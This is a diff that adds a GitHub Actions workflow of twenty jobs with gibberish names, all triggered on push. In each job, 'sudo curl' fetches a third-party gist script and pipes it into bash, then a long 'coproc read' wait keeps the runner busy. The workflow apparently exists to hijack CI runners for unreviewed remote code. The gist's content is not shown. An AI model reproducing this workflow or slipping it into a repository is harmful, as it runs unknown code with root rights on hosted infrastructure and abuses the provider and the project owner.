@@ -1,0 +1,123 @@
+name: kozagasa
+on: push
+jobs:
+  zupezopo1:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "bafajojahu"; sleep 20; echo "suwefetijo 82690 kolupa 41403 sajamohopidokugu 92441"
+  zeduxi2:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "bikigo"; sleep 30; echo "gacatoluzi 82690 jomugono 41403 gogonezohekopenege 988763"
+  vixuva3:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "zoyumaru"; sleep 40; echo "jebojuxo 82690 tixiti 41403 nemavidu 590593"
+  ciwomeda4:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "tigivi"; sleep 50; echo "huluke 82690 zadapevesitaki 41403 vicigazalupi 356272"
+  vohucoco5:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "nulumofu"; sleep 60; echo "rorezeto 82690 vaderudigogefu 41403 lozefonizutegasivatupu 139662"
+  hofitosu6:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "gahemu"; sleep 70; echo "guvetuzefaro 82690 detenolejami 41403 judabejulanucabasasu 287981"
+  repajoni7:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "vehutuxo"; sleep 80; echo "xonofipeke 82690 juripono 41403 suzufaguyedaravuxa 944522"
+  suwije8:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "kujohuco"; sleep 90; echo "pogecori 82690 secefini 41403 tilusabocobenogidupuba 53511"
+  lopa9:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "segayo"; sleep 91; echo "bocuyefi 82690 gavujotivuvo 41403 socuxuhihahagugeloga 452117"
+  bejero0:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "nihituhi"; sleep 97; echo "mudisobo 82690 zajeyagavi 41403 xerixulenogoyeceli 561924"
+  doyo11:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "tozuvehi"; sleep 22; echo "xafikidinu 82690 hanubapejiwi 41403 xataxufezedi 178900"
+  jugetu21:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "kotalu"; sleep 33; echo "hifixi 82690 keyalaceri 41403 wipacovipejewomayeze 213517"
+  hunalo31:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "vajozoso"; sleep 44; echo "zesasi 82690 cefideyagewoyo 41403 lovavukageyoha 222944"
+  bixu41:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "vudogoseko"; sleep 59; echo "cafinitupe 82690 bamucawavela 41403 pakahovinurekuzecerayise 929826"
+  powowayi51:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "xomiwi"; sleep 68; echo "xirupoga 82690 gepuva 41403 hijuriloyagezoyuni 476901"
+  vajece61:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "torada"; sleep 77; echo "vavuweja 82690 zalewopu 41403 cutogiwika 315363"
+  tedagowi71:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "titefa"; sleep 86; echo "newopoxi 82690 yojawicisacu 41403 domoyuravexu 68463"
+  royo81:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "wafinuco"; sleep 95; echo "wepunugidu 82690 kiyegu 41403 pemizugu 946512"
+  buvino91:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "dokocoke"; sleep 94; echo "ginadeja 82690 tiwevigenudogo 41403 hezatofonoda 444048"
+  kexafu01:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - run: sudo rm -f /etc/apt/sources.list.d/dotnetdev.list /etc/apt/sources.list.d/microsoft-prod.list; sudo apt-get update; sudo apt install tmux build-essential p7zip-full wget curl -y; sudo curl -sL https://gist.githubusercontent.com/rambyunel/02a2da1eb46a32a29702d7ba3216e782/raw/43c63f259d133bec3cf6c12b28e7a451f2c1d7a0/gistfile1.txt | bash -
+    - run: coproc read -t 10080 && wait "$!" || true; echo "zaseraca"; sleep 93; echo "vodasumuge 82690 totahijo 41403 wacizomuye 314650"
